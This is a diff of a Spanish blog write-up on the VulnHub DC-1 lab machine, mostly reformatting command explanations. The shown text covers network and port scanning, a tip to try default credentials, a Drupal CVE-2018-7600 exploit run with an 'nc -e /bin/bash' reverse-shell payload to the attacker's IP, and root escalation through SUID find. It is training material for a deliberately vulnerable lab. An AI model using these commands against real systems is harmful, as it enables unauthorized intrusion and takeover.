@@ -4,12 +4,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-<title>WriteUp: DC-1 | VulnHub | MaxisFront</title><meta name="description" content="Máquina DC:1 de VulnHub | Reto hecho por: DCAU | Serie: DC"><meta property="og:title" content="WriteUp: DC-1 | VulnHub"><meta property="og:description" content="Máquina DC:1 de VulnHub | Reto hecho por: DCAU | Serie: DC"><meta property="og:type" content="article"><meta property="og:url" content="https://maxisfront.github.io/es/posts/writeup-dc-1-vulnhub/"><meta property="og:image" content="https://maxisfront.github.io/posts/writeup-dc-1-vulnhub/Drupal_Logo.png">
+<title>WriteUp: DC-1 | VulnHub | MaxisFront</title><meta name="description" content="Máquina DC:1 de VulnHub | Desafío hecho por: DCAU | Serie: DC"><meta property="og:title" content="WriteUp: DC-1 | VulnHub"><meta property="og:description" content="Máquina DC:1 de VulnHub | Desafío hecho por: DCAU | Serie: DC"><meta property="og:type" content="article"><meta property="og:url" content="https://maxisfront.github.io/es/posts/writeup-dc-1-vulnhub/"><meta property="og:image" content="https://maxisfront.github.io/posts/writeup-dc-1-vulnhub/Drupal_Logo.png">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630"><meta property="og:site_name" content="MaxisFront"><meta property="og:locale" content="es">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="WriteUp: DC-1 | VulnHub">
-<meta name="twitter:description" content="Máquina DC:1 de VulnHub | Reto hecho por: DCAU | Serie: DC"><meta name="twitter:image" content="https://maxisfront.github.io/posts/writeup-dc-1-vulnhub/Drupal_Logo.png">
+<meta name="twitter:description" content="Máquina DC:1 de VulnHub | Desafío hecho por: DCAU | Serie: DC"><meta name="twitter:image" content="https://maxisfront.github.io/posts/writeup-dc-1-vulnhub/Drupal_Logo.png">
 <link rel="canonical" href="https://maxisfront.github.io/es/posts/writeup-dc-1-vulnhub/">
 
 <link rel="alternate" hreflang="en" href="https://maxisfront.github.io/posts/writeup-dc-1-vulnhub/"><link rel="stylesheet" href="/css/primer.min.c12daf26af408c64f29cc993dd5ab422334e71e50fa7198111b729fdf674e34d.css" integrity="sha256-wS2vJq9AjGTynMmT3Vq0IjNOceUPpxmBEbcp/fZ0400=">
@@ -139,29 +139,37 @@
 <hr>
 <h2 id="escaneo-y-análisis-de-vulnerabilidades">Escaneo y Análisis de Vulnerabilidades</h2>
 <p>Primeramente analizamos nuestra red local a través del comando <code>arp-scan</code>, especificando nuestra interfaz de red. El comando utilizado fue este:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth3 -l</span></span></code></pre></div><ul>
-<li><code>arp-scan: Permite identificar equipos conectados a la misma red que el host</code></li>
-<li><code>-I interface: Especificamos la interfaz de red donde se enviarán solicitudes para identificar dispositivos</code></li>
-<li><code>-l: Descubrimiento de dispositivos en nuestra subred local (--localnet) </code></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth3 -l</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>arp-scan</code>: Permite identificar equipos conectados a la misma red que el host.</li>
+<li><code>-I</code>: interface: Especificamos la interfaz de red donde se enviarán solicitudes para identificar dispositivos.</li>
+<li><code>-l</code>: Descubrimiento de dispositivos en nuestra subred local (&ndash;localnet).</li>
 </ul>
+</blockquote>
 <img src="./images/20260306192120.png" alt="Identifying the IP" loading="lazy">
 <p>La dirección IP de interés es la <code>192.168.1.169</code>. Realizamos una prueba de conectividad a través de <code>ping</code> para verificar que es posible entablar una conexión entre la máquina objetivo y la nuestra.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>ping -c1 192.168.1.169 -R</span></span></code></pre></div><ul>
-<li><code>ping: Envía un paquete ICMP para verificar si un equipo está activo</code></li>
-<li><code>-c1: Especificamos que solo se envíe un paquete y se espere a recibirlo</code></li>
-<li><code>-R: Solicitamos que se trace la ruta del paquete para observar si hay conexión directa o el paquete pasa por nodos durante el proceso (Los cuales pueden reducir el valor del TTL)</code></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>ping -c1 192.168.1.169 -R</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>ping</code>: Envía un paquete ICMP para verificar si un equipo está activo.</li>
+<li><code>-c1</code>: Especificamos que solo se envíe un paquete y se espere a recibirlo.</li>
+<li><code>-R</code>: Solicitamos que se trace la ruta del paquete para observar si hay conexión directa o el paquete pasa por nodos durante el proceso (Los cuales pueden reducir el valor del TTL).</li>
 </ul>
+</blockquote>
 <img src="./images/20260306195718.png" alt="Testing the connection with the victim" loading="lazy">
 <p>Podemos observar que la ruta de nuestra traza ICMP indica una conexión exitosa. Por otro lado, un valor del TTL cercano a  <code>64</code> suele implicar que nos enfrentamos a un OS <code>Linux/Unix</code> (Aunque esto no es una identificación definitiva).</p>
 <hr>
 <h3 id="reconocimiento-de-puertos">Reconocimiento de Puertos</h3>
 <p>Enumeramos los <code>65535</code> puertos del sistema a través de la herramienta <code>Nmap</code> (Network Mapper) para intentar identificar puertos TCP abiertos:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#bd93f9">5000</span> -Pn -n -oN nmap-scan 192.168.1.169</span></span></code></pre></div><ul>
-<li><code>-p-: Nmap escanea los 65535 puertos TCP de un host.</code></li>
-<li><code>--min-rate: Se envían como mínimo X cantidad de paquetes por segundo</code></li>
-<li><code>-Pn: (No Ping) Omite el descubrimiento de host mediante _ping_, asumiendo que todos los puertos indicados están activos.</code></li>
-<li><code>-n: (No DNS resolution) Se omite la resolución DNS inversa (De esta manera no pierde tiempo solicitando al servidor DNS el nombre de la dirección IP 192.168.1.169)</code></li>
-<li><code>-oN archivo_nombre: Exportamos el output de Nmap casi tal cual como nos lo muestra en la terminal</code></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#bd93f9">5000</span> -Pn -n -oN nmap-scan 192.168.1.169</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>-p-</code>: Nmap escanea los 65535 puertos TCP de un host.</li>
+<li><code>--min-rate</code>: Se envían como mínimo X cantidad de paquetes por segundo.</li>
+<li><code>-Pn (No Ping)</code>: Omite el descubrimiento de host mediante <em>ping</em>, asumiendo que todos los puertos indicados están activos.</li>
+<li><code>-n: (No DNS resolution)</code>: Se omite la resolución DNS inversa (De esta manera no pierde tiempo solicitando al servidor DNS el nombre de la dirección IP 192.168.1.169).</li>
+</ul>
+</blockquote>
+<ul>
+<li><code>-oN archivo_nombre</code>: Exportamos el output de Nmap casi tal cual como nos lo muestra en la terminal.</li>
 </ul>
 <blockquote>
 <p>&lt;= Importante =&gt;
@@ -238,7 +246,7 @@ En entornos empresariales se desaconseja una enumeración agresiva, puesto que e
 <p>En el puerto 80 se está ejecutando un servicio <code>http</code>, el cual tras visitarlo nos indica que - como ya se ha comentado - hace uso del CMS &ldquo;<code>Drupal 7</code>&rdquo;:</p>
 <img src="./images/20260307120546.png" alt="Home of the Drupal 7 web page" loading="lazy">
 <blockquote>
-<p>En entornos de pentesting web es buena idea probar credenciales comunes, tales como <code>admin:admon</code> o <code>user:password</code>. Esto suele ser frecuente en sistemas antiguos y con mantenimiento irregular.</p>
+<p>En entornos de pentesting web es buena idea probar credenciales comunes, tales como <code>admin:admin</code> o <code>user:password</code>. Esto suele ser frecuente en sistemas antiguos y con mantenimiento irregular.</p>
 </blockquote>
 <p>A pesar de que el sistema web sea antiguo, no posee credenciales comunes.  A pesar de ello, hay otro campo de interés: <code>Create new account</code>:</p>
 <img src="./images/20260307121144.png" alt="Identifying the admin account" loading="lazy">
@@ -270,10 +278,12 @@ En entornos empresariales se desaconseja una enumeración agresiva, puesto que e
 <h3 id="creación-de-una-reverse-shell">Creación de una Reverse Shell</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>&gt; Máquina Atacante
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span></span></span></code></pre></div><ul>
-<li><code>nc: Permite crear un sistema Cliente/Servidor para entablar una conexión (Útil para crear una reverse shell).</code></li>
-<li><code>-lvnp 4444: Especificamos a nc que entre en modo escucha, sea de tipo verbose (Dé más detalles), no realice resolución DNS (Usando así una IP directamente y reduciendo tiempos de espera) y permita especificar un puerto para conexiones entrantes (El 4444 para nuestro caso).</code></li>
+</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span></span></span></code></pre></div><blockquote>
+<ul>
+<li><code>nc</code>: Permite crear un sistema Cliente/Servidor para entablar una conexión (Útil para crear una reverse shell).</li>
+<li><code>-lvnp 4444</code>: Especificamos a nc que entre en modo escucha, sea de tipo verbose (Dé más detalles), no realice resolución DNS (Usando así una IP directamente y reduciendo tiempos de espera) y permita especificar un puerto para conexiones entrantes (El 4444 para nuestro caso).</li>
 </ul>
+</blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>python3 drupa7-CVE-2018-7600.py -c <span style="color:#f1fa8c">&#39;nc -e /bin/bash $IP 4444&#39;</span> http://192.168.1.169/</span></span></code></pre></div><blockquote>
 <p>&lt;= Aclaración =&gt;
 En equipos actuales, la flag <code>-e</code> no está disponible por razones de seguridad.</p>
@@ -285,35 +295,41 @@ En equipos actuales, la flag <code>-e</code> no está disponible por razones de 
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash <span style="color:#6272a4"># Presionamos CTRL + Z después de esto</span>
 </span></span><span style="display:flex;"><span>stty raw -echo; <span style="color:#8be9fd;font-style:italic">fg</span>
 </span></span><span style="display:flex;"><span>reset xterm
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>xterm</span></span></code></pre></div><ul>
-<li><code>script /dev/null -c bash: Este comando le indica al sistema grabar lo que sucede en una sesión de terminal, descartando el registro (log) del comando script.</code></li>
-<li><code>CTRL + Z: Suspende temporalmente la reverse shell.</code></li>
-<li><code>stty raw -echo; fg: Permite enviar carácteres crudos a la terminal (Permitiendo comandos como CTRL + C), así como que evita duplicar el input. Por último, fg (foreground) retorna a primer plano la shell previamente suspendida.</code></li>
-<li><code>reset xterm: Reinicia los parámetros de control de la terminal, limpiando la pantalla y arreglando el cursor.</code></li>
-<li><code>export TERM=xterm: Le indica al sistema remoto nuestro tipo de terminal, permitiendo así renderizar interfaces visuales (Como Vim o Nano)</code></li>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>xterm</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>script /dev/null -c bash</code>: Este comando le indica al sistema grabar lo que sucede en una sesión de terminal, descartando el registro (log) del comando script.`</li>
+<li><code>CTRL + Z</code>: Suspende temporalmente la reverse shell.</li>
+<li><code>stty raw -echo; fg</code>: Permite enviar carácteres crudos a la terminal (Permitiendo comandos como CTRL + C), así como que evita duplicar el input. Por último, fg (foreground) retorna a primer plano la shell previamente suspendida.</li>
+<li><code>reset xterm</code>: Reinicia los parámetros de control de la terminal, limpiando la pantalla y arreglando el cursor.</li>
+<li><code>export TERM=xterm</code>: Le indica al sistema remoto nuestro tipo de terminal, permitiendo así renderizar interfaces visuales (Como Vim o Nano).</li>
 </ul>
+</blockquote>
 <p>Ahora ya tenemos una <code>shell completamente interactiva</code>:</p>
 <img src="./images/20260307135813.png" alt="Interactive Reverse Shell established" loading="lazy">
 <h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
 <p>Para realizar la escalada de privilegios, podemos buscar binarios con permisos SUID, los cuales son comúnmente asignados para ejecutar binarios con permisos de administrador sin necesidad de que el usuario esté en el grupo sudoers.</p>
 <p>Una manera de buscarlos, es la siguiente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 -user root 2&gt;/dev/null</span></span></code></pre></div><ul>
-<li><code>find: Utilidad capaz de buscar en el sistema elementos con características específicas.</code></li>
-<li><code>/: Buscamos desde el directorio raíz</code></li>
-<li><code>-perm -4000: Buscamos archivos con permisos SUID (Set User ID)</code></li>
-<li><code>-user root: Especificamos que los archivos deben de pertenecerle al usuario root</code></li>
-<li><code>2&gt;/dev/null: Redigirimos los errores a /dev/null para ocultarlos y solo enfocarnos en las respuestas válidas</code></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 -user root 2&gt;/dev/null</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>find</code>: Utilidad capaz de buscar en el sistema elementos con características específicas.</li>
+<li><code>/</code>: Buscamos desde el directorio raíz.</li>
+<li><code>-perm -4000</code>: Buscamos archivos con permisos SUID (Set User ID).</li>
+<li><code>-user root</code>: Especificamos que los archivos deben de pertenecerle al usuario root.</li>
+<li><code>2&gt;/dev/null</code>: Redigirimos los errores a /dev/null para ocultarlos y solo enfocarnos en las respuestas válidas.</li>
 </ul>
+</blockquote>
 <img src="./images/20260307141326.png" alt="Identifying the find binary with the SUID bit" loading="lazy">
 <h3 id="aprovechamiento-del-suid-de-find">Aprovechamiento del SUID de Find</h3>
 <p>Dentro de todas las respuestas, es posible observar un SUID crítico: <code>/usr/bin/find</code>. Si buscamos en GFTOBins, vemos un comando crucial:</p>
 <img src="./images/20260307142638.png" alt="Using GFTOBins to get root privileges" loading="lazy">
 <p>El <code>SUID</code> del binario <code>find</code> nos permite <code>ejecutar el intérprete de comandos (sh)</code> a través del siguiente comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>find . -exec /bin/sh <span style="color:#f1fa8c">\;</span> -quit</span></span></code></pre></div><ul>
-<li><code>-exec: Permite la ejecución de comandos, y termina cuando llega hasta un &quot;;&quot;</code></li>
-<li><code>\; Le indica a &quot;find&quot; hasta dónde terminan los argumentos de la flag &quot;-exec&quot;, pero permitiendo ejecutar otros comandos luego del cierre (La barra invertida evita que la terminal lo interpréte y el comando &quot;find&quot; quede a medias)</code></li>
-<li><code>-quit: Le especifica al comando &quot;find&quot; que termine la ejecución a la primera coincidencia</code></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>find . -exec /bin/sh <span style="color:#f1fa8c">\;</span> -quit</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>-exec</code>: Permite la ejecución de comandos, y termina cuando llega hasta un &ldquo;;&rdquo;.</li>
+<li><code>\</code>: Le indica a &ldquo;find&rdquo; hasta dónde terminan los argumentos de la flag &ldquo;-exec&rdquo;, pero permitiendo ejecutar otros comandos luego del cierre (La barra invertida evita que la terminal lo interpréte y el comando &ldquo;find&rdquo; quede a medias).</li>
+<li><code>-quit</code>: Le especifica al comando &ldquo;find&rdquo; que termine la ejecución a la primera coincidencia.</li>
 </ul>
+</blockquote>
 <blockquote>
 <p>Es relevante destacar que el bit <code>SUID</code> en el comando <code>find</code> permite ejecutar los comandos posteriores (Como /bin/sh) con los privilegios del dueño del archivo, es decir, <em><code>root</code></em>.</p>
 </blockquote>
